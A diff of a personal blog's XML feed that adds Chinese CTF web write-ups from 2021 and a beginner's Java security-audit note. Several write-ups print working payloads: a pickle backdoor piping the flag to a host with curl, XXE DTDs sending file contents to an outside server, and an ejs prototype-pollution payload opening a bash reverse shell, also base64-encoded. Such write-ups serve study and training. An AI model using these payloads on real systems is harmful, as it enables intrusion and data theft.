@@ -4,6 +4,195 @@
   
   
   <entry>
+    <title>东华杯</title>
+    <link href="/2021/11/07/%E4%B8%9C%E5%8D%8E%E6%9D%AF/"/>
+    <url>/2021/11/07/%E4%B8%9C%E5%8D%8E%E6%9D%AF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="EzGadget"><a href="#EzGadget" class="headerlink" title="EzGadget"></a>EzGadget</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>WP</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>TSCTF</tag>
+      
+      <tag>WP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>强网拟态</title>
+    <link href="/2021/11/07/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
+    <url>/2021/11/07/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
+    
+    <content type="html"><![CDATA[<h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>题目提示readFile(“./src/index.js”)，所以尝试readFile(“/flag”)得到flag</p><p><img src="https://md.buptmerak.cn/uploads/upload_58b9e93800f31335dac6f874a29cfa1a.png" alt="img"></p><h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><p>扫描目录。可以发现/old/ 以及/flag.php。<br>然后通过awvs可以发现，在feature.php下有一个api会利用Cookie include文件。<br>发现/feature不是很好用，利用/old/feature.php来包含任意文件。直接包含/var/www/html/flag.php即可。</p><h3 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h3><p>提供了写入和读取两种操作，b64参数c之后写入文件内<br>写入之后会返回文件名，接下来的问题是怎么在包含时能够解码文件，因为读取时只能控制”resource=”后面的内容<br>构造<code>r=convert.base64-decode/../xxx</code><br>拼接后成为<code>php://filter/resource=./files/convert.base64-decode/../xxx</code><br>调用了转换过滤器的同时又把<code>convert.base64-decode</code>当成了一个文件名，加<code>../</code>进行目录穿越后包含到恶意代码(上面会有一堆报错，雀氏挺另类的)<br><img src="https://md.buptmerak.cn/uploads/upload_23403d8ce8b50e2a191d26e8bbbf55dd.png" alt="img"></p><h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>天翼杯原题，首先/;/绕过，然后<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>直接打<br><img src="https://md.buptmerak.cn/uploads/upload_fa14a8e59c7d21682ccfa66c4d509322.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_7cfd9ce031a9680de9c4b5ac6c981662.png" alt="img"></p><h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p>安装页面存在数据库连接操作，考虑用<a href="https://github.com/allyshka/Rogue-MySql-Server">rogue_mysql</a>搭建恶意mysql server，尝试后发现被forbidden了<img src="https://md.buptmerak.cn/uploads/upload_6fa66bf83711125947b7942d00635bd9.png" alt="img"><br>观察install.php后，发现题目提供了多个数据库选择。选择mysqli后成功得到flag<img src="https://md.buptmerak.cn/uploads/upload_9f0816d213c0d813ac6a973bae2a487a.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_f94b19fd43118d06ecf04e9a01bfe0fa.png" alt="img"></p><h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><p>pickle反序列化题。在<code>config</code>中有后门，但是需要修改notadmin中的<code>admin</code>为<code>yes</code>。</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">Class RestrictedUnpickler(pickle.Unpickler):<br>    def find_class(self, <span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span><span class="hljs-built_in"> not</span> <span class="hljs-keyword">in</span><span class="hljs-built_in"> name</span>:<br>            <span class="hljs-keyword">return</span> getattr(sys.modules[<span class="hljs-keyword">module</span>],<span class="hljs-built_in"> name</span>)<br>        raise pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (<span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>))<br></code></pre></div></td></tr></table></figure><p>观察发现限定了<code>c</code>操作符加载的<code>module</code>为<code>config</code>，手搓个覆盖, 并且执行后门。</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">cconfig<br>notadmin<br>(S<span class="hljs-string">&#x27;admin&#x27;</span><br>S<span class="hljs-string">&#x27;yes&#x27;</span><br>ucconfig<br>backdoor<br>(S<span class="hljs-string">&#x27;exec(&quot;import os;os.system(&#x27;</span>curl ip -d <span class="hljs-string">`cat /flag`</span><span class="hljs-string">&#x27;)&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>长城杯</title>
+    <link href="/2021/11/07/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
+    <url>/2021/11/07/%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>字节跳动</title>
+    <link href="/2021/11/07/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/"/>
+    <url>/2021/11/07/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>java做题1</title>
+    <link href="/2021/11/06/java%E5%81%9A%E9%A2%98(1)/"/>
+    <url>/2021/11/06/java%E5%81%9A%E9%A2%98(1)/</url>
+    
+    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-filejava"><a href="#网鼎杯-2020-filejava" class="headerlink" title="网鼎杯 2020 filejava"></a>网鼎杯 2020 filejava</h1><p><a href="https://www.4armed.co/blog/exploiting-xxe-with-excel/">https://www.4armed.co/blog/exploiting-xxe-with-excel/</a></p><p><a href="https://xz.aliyun.com/t/7747">https://xz.aliyun.com/t/7747</a></p><p>下载文件处有filename目录穿越，结合报错可知道源码位置从而dump下源码开始审计</p><p><img src="https://img-blog.csdnimg.cn/afd99418b023483389e6210ebb2497d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/a2f5a947cd70454cb3c03923d962d22c.png" alt="在这里插入图片描述"></p><p>看到这里就很明显了，判断后缀名应该是xlsx，开头限制了为excel-，考的就是excel进行xxe攻击</p><p>最开始使用得是这种打法</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:2122&#x2F;1.dtd&quot;&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<br></code></pre></div></td></tr></table></figure><p>1.dtd为</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;vps:2122&#x2F;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p>感觉都行的，但是怎么打也打不通，后来换了一下，</p><p><img src="https://img-blog.csdnimg.cn/5dc2c253ce9d42789fca303bd78f8296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>file.dtd中为</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;39.107.239.30:3333?p&#x3D;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/023f546407c845e48a269462caf19bde.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/74b606bf5867403eae11993a981078cd.png" alt="在这里插入图片描述"></p><h1 id="网鼎杯ThinkJava"><a href="#网鼎杯ThinkJava" class="headerlink" title="网鼎杯ThinkJava"></a>网鼎杯ThinkJava</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>java</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>node</title>
+    <link href="/2021/11/01/GKCTF2021/"/>
+    <url>/2021/11/01/GKCTF2021/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>考点为js弱类型比较，ejs原型链污染rce</p><p>原理参考ejs原型链污染rce</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><p><a href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/</a></p><p>审计源码发现存在</p><p>一个<code>login</code>登录并且有白名单过滤，</p><p>登录后存在token认证</p><p>可以在<code>/addAdmin</code>下添加admin账户</p><p>最后可以在不知道在干啥的<code>adminDIV</code>路由发现原型链污染漏洞，这里的<code>extend</code>方法会将第二个参数<code>JSON.parse(addDIV)</code>压入到第一个参数中，这里还特别用了<code>JSON.parse</code>防止了<code>__proto__</code>被当作原型。</p><p><img src="https://img-blog.csdnimg.cn/977632bb08cc424bb003e551981d48be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>本地测试了一下</p><p><img src="https://img-blog.csdnimg.cn/26570674c40e4f12a198de84f9d7218a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第二个漏洞点在于<code>ejs</code>的模板引擎rce，需要借助第一步的原型链污染实现</p><p><code>&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.163.238 /2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><p>但是要进入<code>adminDIV</code>需要进行登录，登录中需要绕过白名单，这个考的是js弱类型，数组真的是在任何题目都可能考到的东西，虽然这个点不大，但以后一定要经常记起来这个东西，不然就会卡半天。这里过滤的逻辑是</p><p>在白名单<code>blacklist = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>中遍历，当用户输入中有白名单中的字符则让这个字符变成<code>*</code>。</p><p>这里可以想如果我们输入的参数为一个数组，那么<code>str[i]</code>就是一个字符，则<code>if (waf(str[i]) ==&quot;*&quot;)</code>肯定为false，从而绕过，但是这样进行sql查询时，数组没有substr方法会报错，可以看到if里面还有个拼接操作，在js中数组加上字符串最后结果是一个字符串，所以仍然需要进入if语句中，所以这里的思路就是构造一个数组但是数组里面会含有白名单中的字符。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123;<br>       blacklist = [<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>]<br>       blacklist.forEach(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> &#123;<br>           <span class="hljs-keyword">if</span> (str == element)&#123;<br>               str = <span class="hljs-string">&quot;*&quot;</span>;<br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">return</span> str;<br>   &#125;<br><br>   <span class="hljs-keyword">const</span> safeStr = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; str.length;i++)&#123;<br>       <span class="hljs-keyword">if</span> (waf(str[i]) ==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>           <br>           str =  str.slice(<span class="hljs-number">0</span>, i) + <span class="hljs-string">&quot;*&quot;</span> + str.slice(i + <span class="hljs-number">1</span>, str.length);<br>       &#125;<br>       <br>   &#125;<br></code></pre></div></td></tr></table></figure><p>构造payload，这里username长度得足够因为后面还有substr方法</p><p><code>username[]=admin&#39;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=123456    </code></p><p>这样最后结果就是</p><p><img src="https://img-blog.csdnimg.cn/441ad71931b54ccea4d23a414367b0b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>改包发送得到token</p><p><img src="https://img-blog.csdnimg.cn/8cf203044c9a4c2cbb17df42d85c0a4d.png" alt="在这里插入图片描述"></p><p>用得到的token添加admin用户，注意让添加的用户名为<code>__proto__</code>，然后用添加成功的admin用户登录然后进行原型污染。用新用户登录中直接登录就不行，非得用hackbar，真不知道为啥。</p><p><img src="https://img-blog.csdnimg.cn/dc3867f9e44d49818444c4a2481d99fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>拿到新用户token后进行原型链污染，然后访问admin页面进入 ejs 渲染引擎getshell，buu内网靶机监听。</p><p><code>data=&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xNjMuMjM4LzIzMzMgMD4mMQo= | base64 -d | bash&#39;);var __tmp2&quot;&#125;&#125;</code></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>绿城杯</title>
+    <link href="/2021/10/30/%E7%BB%BF%E5%9F%8E%E6%9D%AF/"/>
+    <url>/2021/10/30/%E7%BB%BF%E5%9F%8E%E6%9D%AF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h1><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">POST /validated/json-schema/validate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br>&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>天翼杯复现</title>
     <link href="/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
     <url>/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
@@ -20,9 +209,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -47,9 +236,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>nodejs</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -101,9 +290,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -112,11 +301,11 @@
   
   
   <entry>
-    <title>羊城杯</title>
-    <link href="/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A1(1)/"/>
-    <url>/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A1(1)/</url>
+    <title>java审计1</title>
+    <link href="/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A11/"/>
+    <url>/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A11/</url>
     
-    <content type="html"><![CDATA[<p>参考：<a href="https://xz.aliyun.com/t/7945#toc-27">https://xz.aliyun.com/t/7945#toc-27</a></p>]]></content>
+    <content type="html"><![CDATA[<p>参考：</p><p><a href="https://xz.aliyun.com/t/7945#toc-27">https://xz.aliyun.com/t/7945#toc-27</a></p><p><a href="https://www.cnblogs.com/liudaihuablogs/p/14167448.html">https://www.cnblogs.com/liudaihuablogs/p/14167448.html</a></p><p>java初学是真滴难受，网上一些反序列化都直接从cc库开始无语，硬着头皮看吧</p><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><p>可参考<a href="https://b1ngz.github.io/java-sql-injection-note/">https://b1ngz.github.io/java-sql-injection-note/</a></p><ol><li><p><strong>直接拼接，未进行过滤</strong></p><p>将<code>request.getParameter(&quot;&quot;)</code>直接放在SQL语句。</p><p>全局搜索查看：<code>String sql</code>等。</p></li></ol><p><img src="https://img-blog.csdnimg.cn/64300da5efe04ed4852c4683d714c2f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        PrintWriter out = resp.getWriter();<br>        Enumeration parameterNames=req.getParameterNames();<br>        System.out.println(parameterNames);<br>        <span class="hljs-keyword">while</span> (parameterNames.hasMoreElements())&#123;<br>            String t = (String) parameterNames.nextElement();<br>            <span class="hljs-keyword">if</span>(t.equals(<span class="hljs-string">&quot;username&quot;</span>))&#123;<br>                useranme = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;username:&quot;</span> + useranme + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (t.equals(<span class="hljs-string">&quot;password&quot;</span>))&#123;<br>                password = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;password:&quot;</span> + password + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                out.write(<span class="hljs-string">&quot;only user pass&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//        System.out.println(param);</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            login(useranme,password);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ol><li><p><strong>%和_</strong></p><p>没有手动过滤%。预编译是不能处理这个符号的， 所以需要手动过滤，否则会造成慢查询，造成 dos。</p></li><li><p><strong>Order by、from等无法预编译</strong></p><p>如以下示例，需要手动过滤，否则存在sql注入。</p><p><code>String sql = &quot;Select * from news where title =?&quot; + &quot;order by &#39;&quot; + time + &quot;&#39; asc&quot;</code></p></li><li><p><strong>Mybatis 框架</strong></p><p>使用注解或者xml将java对象与数据库sql操作对应。</p><p>在注解中或者 Mybatis 相关的配置文件中搜索 $ 。然后查看相关 sql 语句上下文环境。</p><p><strong>mybatis简单示例</strong></p><ul><li>mybatis的maven配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li></ol><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>可参考</p><p><a href="https://xz.aliyun.com/t/2041">https://xz.aliyun.com/t/2041</a></p><p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p><p>首先，一个类的对象要想序列化成功，必须满足两个条件：</p><ol><li>该类必须实现 java.io.Serializable 接口。</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ol><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p><p>一个简单得样例，通过重写readObject方法，在其中执行命令达到触发漏洞效果。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//读取输入流,并转换对象</span><br><span class="hljs-comment">//        Scanner input = new Scanner(System.in);</span><br><span class="hljs-comment">//        InputStream in= request.getInputStream();</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(in); //恢复对象</span><br><span class="hljs-comment">//        ois.readObject();</span><br><span class="hljs-comment">//        ois.close();</span><br>        SerialObject s = <span class="hljs-keyword">new</span> SerialObject(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;KKfine&quot;</span>);<br>        FileOutputStream fileOut = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./ test.ser&quot;</span>);<br>    